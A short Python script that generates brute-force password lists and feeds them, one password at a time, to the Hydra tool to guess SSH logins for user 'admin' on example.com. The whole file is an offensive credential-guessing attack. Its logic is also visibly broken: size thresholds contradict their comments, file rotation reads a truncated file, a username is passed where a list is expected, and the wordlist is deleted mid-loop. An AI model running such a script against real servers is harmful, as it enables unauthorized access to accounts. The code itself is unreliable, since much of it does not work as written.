import os
import shutil
import subprocess
import string
import itertools
import time

def password_generator(length_range, base_file_name, threads):
    file_number = 0
    file_name = base_file_name + str(file_number) + ".txt"

    while os.path.getsize(file_name) > 300485760:  # 10 MB threshold
        file_number += 1
        file_name = base_file_name + str(file_number) + ".txt"

    with open(file_name, 'w') as file:
        for length in range(*length_range):
            for password_chars in itertools.islice(itertools.product(string.ascii_letters + string.digits + string.punctuation, repeat=length), 0, threads):
                password = ''.join(password_chars)
                file.write(f"{password}\n")
                file.flush()
                time.sleep(0.1)  # Add a delay of 0.1 seconds

                if file.tell() > 30048576000:  # 10 MB threshold
                    file.close()
                    file_number += 1
                    file_name = base_file_name + str(file_number) + ".txt"
                    with open(file_name, 'w') as new_file:
                        with open(file_name.replace(f"{file_number - 1}", f"{file_number}")) as old_file:
                            new_file.write(old_file.read())
                    file = new_file
                    new_file.close()

    return file_name

def run_hydra(wordlist, target, service, username, threads):
    with open(os.devnull, 'w') as devnull:
        with open(wordlist, 'r') as wordlist_file:
            for line in wordlist_file:
                password = line.strip()
                hydra_command = f"hydra -L {username} -p {password} -t {threads} {target}/{service} -V"
                subprocess.run(hydra_command, shell=True, stdout=devnull, stderr=devnull)
                os.remove(wordlist)
                wordlist = password_generator(range(10, 12), "passwords", threads)
                with open(wordlist, 'a') as wordlist_file:
                    wordlist_file.write(f"{password}\n")

if __name__ == "__main__":
    base_file_name = "passwords"
    wordlist = password_generator(range(10, 12), base_file_name, 10)  # Set the number of threads to 10
    target = "example.com"
    service = "ssh"
    username = "admin"

    # Run Hydra with the generated wordlist
    run_hydra(wordlist, target, service, username, 10)  # Set the number of threads to 10

    # Delete the remaining passwords
    os.remove(wordlist)
